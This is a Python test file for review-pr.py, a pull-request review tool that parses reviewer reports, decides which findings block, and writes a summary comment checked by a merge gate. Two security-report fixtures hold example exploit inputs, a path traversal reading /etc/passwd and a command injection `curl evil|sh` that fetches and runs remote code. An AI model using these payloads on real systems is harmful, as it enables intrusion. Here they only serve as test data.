#!/usr/bin/env python3
"""Cases for review-pr.py, the mechanical half of /review-pr.

The Seam is the script's functions: a reviewer's report in, a verdict and a
summary comment out. The summary is read back with the parsers its real
readers use, merge-gate.py's and the behaviour checks', so a case passes only
when the comment means to them what it says.

GitHub writes are not exercised here. test-review-pr-behaviour.py checks those
on a live pull request.
"""

import importlib.util
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, HERE / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


rp = load("review_pr", "review-pr.py")
gate = load("merge_gate_t", "merge-gate.py")
live = load("behaviour", "test-review-pr-behaviour.py")

HEAD = "c0ffee2c0ffee2c0ffee2c0ffee2c0ffee2c0ffe"
SINCE = "beef001"

CODE_OK = """Looks fine.

VERDICT: approved
CRITICAL_COUNT: 0
HIGH_COUNT: 0
"""

CODE_BLOCKING = """The token is logged.

spec-drift: #60 | earn rate changes from 1 to 2 points | `src/cart/summary.ts:12`

FINDING: High | `src/auth/client.ts:88` | the token is logged in plain text
FINDING: Low | src/util.ts:3 | a tautological comment

VERDICT: changes_requested
CRITICAL_COUNT: 0
HIGH_COUNT: 1
"""

SEC_CLEAN = """No vulnerabilities found.

SECURITY_HIGH: 0
SECURITY_MEDIUM: 0
SECURITY_LOW: 0
"""

SEC_MEDIUM = """# Findings

FINDING: Medium | api/export.py:41 | a path is joined from input; exploit: `?f=../../etc/passwd`

SECURITY_HIGH: 0
SECURITY_MEDIUM: 1
SECURITY_LOW: 0
"""

SEC_HIGH = """FINDING: High | api/export.py:41 | the name reaches a shell; exploit: `?name=x;curl evil|sh`

SECURITY_HIGH: 1
SECURITY_MEDIUM: 0
SECURITY_LOW: 0
"""


def facts(code=CODE_OK, sec=SEC_CLEAN, outcome="Ready", **over):
    c, s = rp.parse_code(code), rp.parse_security(sec)
    base = {
        "outcome": outcome, "outcome_line": "Marked ready." if outcome == "Ready" else "Left as a draft: x.",
        "head": HEAD, "scope": "full", "criteria": None, "last_proven": None,
        "reviewer": "code-reviewer", "security_entry": "codex (default)", "code": c, "security": s,
        "copilot_ran": True, "copilot_why": None, "copilot_line": "requested by /review-pr",
        "autofix_line": "[session_abc](https://claude.ai/code/session_abc) — started",
        "candidates": [{"number": 60, "title": "Loyalty earn and burn"}],
        "code_report": code, "security_report": sec,
    }
    base.update(over)
    return base


def check(cond, why):
    return bool(cond), why


# ---------------------------------------------------------------- reports and verdict

def test_a_report_without_sentinels_is_no_result():
    """a code report missing its sentinels parses as no result"""
    return check(rp.parse_code("All good, ship it.") is None, "parsed as a result")


def test_a_security_report_without_sentinels_is_no_result():
    """a security report missing a count parses as no result"""
    return check(rp.parse_security("SECURITY_HIGH: 0\nSECURITY_LOW: 0") is None, "parsed as a result")


def test_check_exits_1_on_a_report_without_sentinels():
    """`check` exits 1 on a report with no sentinels, so the chain walk moves on"""
    with tempfile.NamedTemporaryFile("w", suffix=".md", delete=False) as f:
        f.write("I could not run the review.")
    proc = subprocess.run([sys.executable, str(HERE / "review-pr.py"), "check", "security", f.name],
                          capture_output=True, text=True)
    return check(proc.returncode == 1, f"exit {proc.returncode}")


def test_findings_and_drift_are_read_from_their_lines():
    """FINDING and spec-drift lines are read with severity, place and text"""
    c = rp.parse_code(CODE_BLOCKING)
    want_f = [
        {"severity": "High", "where": "src/auth/client.ts:88", "what": "the token is logged in plain text"},
        {"severity": "Low", "where": "src/util.ts:3", "what": "a tautological comment"},
    ]
    want_d = [{"spec": 60, "behaviour": "earn rate changes from 1 to 2 points", "where": "`src/cart/summary.ts:12`"}]
    return check(c["findings"] == want_f and c["drift"] == want_d, f"{c['findings']} {c['drift']}")


def test_approved_beside_a_high_count_still_blocks():
    """a report that says approved with a non-zero High count blocks on its count"""
    c = rp.parse_code("VERDICT: approved\nCRITICAL_COUNT: 0\nHIGH_COUNT: 2\n")
    return check(rp.code_blocks(c), "did not block")


def test_a_security_high_blocks_and_a_medium_does_not():
    """a High security finding blocks; a Medium one is listed but does not"""
    return check(
        rp.security_blocks(rp.parse_security(SEC_HIGH)) and not rp.security_blocks(rp.parse_security(SEC_MEDIUM)),
        "wrong blocking decision",
    )


def test_drift_never_blocks():
    """a report with only spec drift and no finding does not block"""
    c = rp.parse_code("spec-drift: #9 | x | a.py:1\nVERDICT: approved\nCRITICAL_COUNT: 0\nHIGH_COUNT: 0\n")
    return check(not rp.code_blocks(c) and len(c["drift"]) == 1, f"blocks={rp.code_blocks(c)}")


def test_a_blocking_count_with_no_finding_line_is_still_listed():
    """a blocking count with no FINDING line still puts a line under Blocking findings"""
    body = rp.compose(facts(code="VERDICT: changes_requested\nCRITICAL_COUNT: 1\nHIGH_COUNT: 0\n", outcome="Draft"))
    blocking = live.section(body, "Blocking findings")
    return check(blocking and "None." not in blocking, repr(blocking))


# ---------------------------------------------------------------- scope

def test_scope_after_a_ready_head_is_since():
    """with a Ready head in the history, the scope is the commits since it"""
    s = rp.decide_scope(HEAD, SINCE, False, lambda _: True)
    return check(s == {"scope": f"since {SINCE}", "since": SINCE}, repr(s))


def test_scope_is_full_without_a_ready_head_after_a_rewrite_or_with_full():
    """no Ready head, a rewritten history, --full, or a re-run on the same head all review the whole PR"""
    cases = [
        rp.decide_scope(HEAD, None, False, lambda _: True),
        rp.decide_scope(HEAD, SINCE, False, lambda _: False),
        rp.decide_scope(HEAD, SINCE, True, lambda _: True),
        rp.decide_scope(HEAD, HEAD[:7], False, lambda _: True),
    ]
    return check(all(c["scope"] == "full" for c in cases), repr(cases))


# ---------------------------------------------------------------- candidate Specs

SPECS = [
    {"spec": 60, "title": "Loyalty cart summary", "criteria": [{"text": "Given a shopper"}]},
    {"spec": 61, "title": "Descartes", "criteria": [{"text": "Then the Port block is reserved"}]},
    {"spec": 62, "title": "Payment ledger", "criteria": [{"text": "x"}]},
]


def nums(specs):
    return [s["number"] for s in specs]


def test_a_title_word_matches_a_whole_path_word_only():
    """`cart` matches src/cart/x.ts and not src/descartes.ts"""
    hit = rp.candidates(SPECS[:1], ["src/cart/x.ts"], [], None)
    miss = rp.candidates(SPECS[:1], ["src/descartes.ts"], [], None)
    return check(nums(hit) == [60] and miss == [], f"{hit} {miss}")


def test_camel_case_paths_are_split_into_words():
    """`src/paymentLedger.ts` names the Payment ledger Spec"""
    return check(nums(rp.candidates(SPECS, ["src/paymentLedger.ts"], [], None)) == [62], "no match")


def test_a_glossary_term_the_criteria_use_matches_a_path():
    """a glossary term a Spec's Criteria use selects the Spec when a path names it"""
    got = rp.candidates(SPECS, ["scripts/port_block.py"], ["Port block", "Slice"], None)
    return check(nums(got) == [61], repr(got))


def test_the_slices_own_spec_is_dropped():
    """the Spec the Slice's Parent names is never a drift candidate"""
    return check(rp.candidates(SPECS[:1], ["src/cart/x.ts"], [], 60) == [], "parent kept")


def test_the_parent_is_read_from_the_slice_body():
    """the Slice's `## Parent` section yields the Spec number"""
    return check(rp.parent_of("## Parent\n\n#60\n\n## What to build\n#9\n") == 60, "wrong parent")


def test_glossary_terms_come_from_the_language_section():
    """glossary terms are the bold terms under `## Language` and nowhere else"""
    text = "# G\n\n## Language\n\n**Spec**:\nA thing.\n\n**Port block**:\nPorts.\n\n## Relationships\n**Not**:\n"
    return check(rp.glossary_terms(text) == ["Spec", "Port block"], repr(rp.glossary_terms(text)))


# ---------------------------------------------------------------- prompts

def test_the_code_prompt_is_fully_filled():
    """the rendered code prompt keeps no placeholder, carries the debris catalog and the sentinels"""
    text = rp.code_prompt(42, HEAD, None, [{"number": 60, "title": "Loyalty"}], "o/r")
    problems = [k for k in ("{pr_number}", "{head}", "{scope}", "{specs}", "{tracker}", "{ai_debris}") if k in text]
    if "Unrequested defensive code" not in text:
        problems.append("no debris catalog")
    if "VERDICT: approved" not in text or "FINDING:" not in text:
        problems.append("no sentinels or FINDING form")
    if "reviewed whole at" in text:
        problems.append("a full review carries the since paragraph")
    return check(not problems, "; ".join(problems))


def test_a_since_review_names_its_range_and_says_no_specs_match():
    """a since review names its range, and no candidates says so explicitly"""
    text = rp.code_prompt(42, HEAD, SINCE, [], "o/r")
    return check(
        f"git diff {SINCE}...{HEAD}" in text and "No implemented Specs match the changed paths." in text,
        "missing range or the no-Specs sentence",
    )


def test_the_security_prompt_is_filled_with_base_and_head():
    """the security prompt diffs base...head and asks for FINDING lines and the sentinels"""
    text = rp.security_prompt(42, SINCE, HEAD)
    return check(
        f"git diff {SINCE}...{HEAD}" in text and "{base}" not in text and "SECURITY_HIGH:" in text
        and "FINDING:" in text,
        "prompt not filled",
    )


def test_the_autofix_prompt_is_filled():
    """the Auto-fix prompt carries the PR, its branch and the on-push sentence"""
    text = rp.autofix_prompt("https://github.com/o/r/pull/42", 42, "feat/x", False)
    return check(
        "HEAD:feat/x" in text and "does not review on push" in text and "{" + "pr_url}" not in text,
        "prompt not filled",
    )


# ---------------------------------------------------------------- the summary, as its readers read it

def test_a_ready_summary_reads_as_fresh_to_the_merge_gate():
    """a Ready summary on the head reads as fresh, names its Auto-fix session, and counts no round"""
    body = rp.compose(facts())
    snap = {"head_sha": HEAD, "comments": [{"body": body, "created_at": "2026-11-01T10:00:00Z"}]}
    found = gate.summaries(snap)
    got = (gate.reviewed(snap, found)["state"], gate.autofix(found)["session"], gate.rounds(found))
    return check(got == ("fresh", "session_abc", 0), repr(got))


def test_a_draft_summary_reads_as_blocked_and_one_round():
    """a Draft summary on the head reads as blocked and counts as one round"""
    body = rp.compose(facts(code=CODE_BLOCKING, outcome="Draft", autofix_line="not started: Draft"))
    snap = {"head_sha": HEAD, "comments": [{"body": body, "created_at": "2026-11-01T10:00:00Z"}]}
    found = gate.summaries(snap)
    got = (gate.reviewed(snap, found)["state"], gate.rounds(found))
    return check(got == ("blocked", 1), repr(got))


def test_the_machine_read_lines_read_back():
    """Head, Scope, Reviewer and Security read back through the live checks' field reader"""
    body = rp.compose(facts(scope=f"since {SINCE}"))
    got = {k: live.field(body, k) for k in ("Head", "Scope", "Security")}
    want = {"Head": HEAD[:7], "Scope": f"since {SINCE}", "Security": "codex (default)"}
    return check(got == want and live.field(body, "Reviewer"), repr(got))


def test_blocking_findings_name_their_place():
    """each blocking finding, code and security, is listed with its path:line"""
    body = rp.compose(facts(code=CODE_BLOCKING, sec=SEC_HIGH, outcome="Draft"))
    blocking = live.section(body, "Blocking findings") or ""
    security = [l for l in blocking.splitlines() if l.lstrip("- ").startswith("Security")]
    return check(
        "src/auth/client.ts:88" in blocking and security and "api/export.py:41" in security[0]
        and "src/util.ts:3" not in blocking,
        repr(blocking),
    )


def test_security_medium_is_listed_not_blocking():
    """a Medium security finding sits under Security findings (not blocking)"""
    body = rp.compose(facts(sec=SEC_MEDIUM))
    advisory = live.section(body, "Security findings (not blocking)") or ""
    return check("api/export.py:41" in advisory and live.section(body, "Blocking findings") == "- None.", advisory)


def test_drift_names_the_spec_with_its_title():
    """spec drift names the Spec number and its title"""
    body = rp.compose(facts(code=CODE_BLOCKING, outcome="Draft"))
    drift = live.section(body, "Spec drift (advisory)") or ""
    return check("#60 Loyalty earn and burn" in drift and "src/cart/summary.ts:12" in drift, drift)


def test_no_candidates_says_so_in_the_drift_section():
    """with no candidate Specs the drift section says none match rather than None."""
    body = rp.compose(facts(candidates=[]))
    return check(
        live.section(body, "Spec drift (advisory)") == "- No implemented Specs match the changed paths.",
        live.section(body, "Spec drift (advisory)"),
    )


def test_a_handed_off_criteria_report_is_carried_unchanged():
    """a /finalize-pr Criteria report rides in the summary, counted, with the line proven on this head"""
    report = "- verified    #60 C1 - `t.ts:1`, test gate green\n- manual      #60 C2 - check it\n\nRule: `weak` blocks."
    body = rp.compose(facts(criteria=report))
    line = live.field(body, "Criteria") or ""
    return check(
        line.startswith("proven on this head") and "1 verified" in line and "1 manual" in line
        and report.strip() in body,
        line,
    )


def test_a_run_without_criteria_names_the_last_proof_and_copies_none():
    """without a hand-off the summary names where Criteria were last proven and carries no Criteria section"""
    body = rp.compose(facts(last_proven="abc1234"))
    return check(
        live.section(body, "Criteria") is None and "last proven on abc1234" in (live.field(body, "Criteria") or ""),
        live.field(body, "Criteria"),
    )


def test_copilot_not_running_is_said_first():
    """on a Ready PR where Copilot did not run, the line under the heading says so"""
    body = rp.compose(facts(copilot_ran=False, copilot_why="Copilot review is disabled"))
    return check(body.splitlines()[2] == "Copilot did not run: Copilot review is disabled.", body.splitlines()[2])


def test_last_proven_skips_summaries_without_criteria():
    """last_proven is the head of the newest summary that carried a Criteria section"""
    with_c = rp.compose(facts(criteria="- verified    #1 C1 - x", head="aaaaaaa" + HEAD[7:]))
    without = rp.compose(facts(head="bbbbbbb" + HEAD[7:]))
    found = [{"body": with_c}, {"body": without}]
    return check(rp.last_proven(found) == "aaaaaaa", rp.last_proven(found))


# ---------------------------------------------------------------- workdir

def test_the_workdir_is_ignored_by_git_and_excluded_once():
    """the run directory never shows in git status, and its exclude line is written once"""
    with tempfile.TemporaryDirectory() as tmp:
        repo = Path(tmp).resolve()
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        env_cwd = Path.cwd()
        try:
            import os
            os.chdir(repo)
            first = rp.workdir()
            rp.workdir()
            (first / "x.md").write_text("x")
            status = subprocess.run(["git", "status", "--porcelain"], capture_output=True, text=True).stdout
            exclude = (repo / ".git" / "info" / "exclude").read_text().splitlines()
        finally:
            os.chdir(env_cwd)
    return check(
        status.strip() == "" and exclude.count(rp.EXCLUDE) == 1 and first == repo / rp.WORKDIR,
        f"status={status!r} excludes={exclude.count(rp.EXCLUDE)} dir={first}",
    )


def main():
    cases = [v for k, v in globals().items() if k.startswith("test_")]
    failed = 0
    for case in cases:
        try:
            ok, why = case()
        except Exception as exc:  # a crash is a failed case, not a crashed suite
            ok, why = False, f"raised {exc!r}"
        print(f"  {'ok ' if ok else 'BAD'}  {case.__doc__.strip()}" + ("" if ok else f": {why}"))
        failed += not ok
    if failed:
        print(f"✘ {failed} of {len(cases)} review-pr.py cases failed")
        return 1
    print(f"✔ {len(cases)} review-pr.py cases pass")
    return 0


if __name__ == "__main__":
    sys.exit(main())
